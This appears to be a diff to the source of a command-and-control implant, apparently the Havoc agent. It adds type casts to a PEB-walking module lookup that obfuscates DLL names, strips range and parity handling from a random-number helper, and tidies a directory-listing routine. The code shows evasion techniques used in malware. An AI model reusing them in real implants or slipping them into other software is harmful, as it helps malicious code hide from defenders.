@@ -176,7 +176,7 @@ PVOID LdrModuleSearch(
     Dll[ 2 ] = HideChar( 'L' );
     Dll[ 0 ] = HideChar( '.' );
 
-    Entry      = Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
+    Entry      = (PLDR_DATA_TABLE_ENTRY)Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;  // Cast LIST_ENTRY to LDR entry
     FirstEntry = &Instance->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList.Flink;
 
     StringCopyW( Name, ModuleName );
@@ -194,7 +194,7 @@ PVOID LdrModuleSearch(
             MemZero( Name, sizeof( Name ) );
             return Entry->DllBase;
         }
-        Entry = Entry->InLoadOrderLinks.Flink;
+        Entry = (PLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;  // Cast LIST_ENTRY
     } while ( Entry != FirstEntry );
 
     MemZero( Name, sizeof( Name ) );
@@ -1308,10 +1308,8 @@ ULONG RandomNumber32(
 
     Seed = NtGetTickCount();
     Seed = Instance->Win32.RtlRandomEx( &Seed );
-    Seed = Instance->Win32.RtlRandomEx( &Seed );
-    Seed = ( Seed % ( LONG_MAX - 2 + 1 ) ) + 2;
 
-    return Seed % 2 == 0 ? Seed : Seed + 1;
+    return Seed;
 }
 
 /*!
@@ -1500,7 +1498,7 @@ PROOT_DIR listDir(
     PSUB_DIR         SubDir        = NULL;
     BOOL             IsDir         = FALSE;
     LPWSTR           Path          = NULL;
-    UINT32           PathSize      = NULL;
+    UINT32           PathSize      = 0;  // Use 0 for integers, not NULL
     BOOL             Success       = FALSE;
 
     if ( ( ! StartPath ) || ( FilesOnly && DirsOnly ) ) {
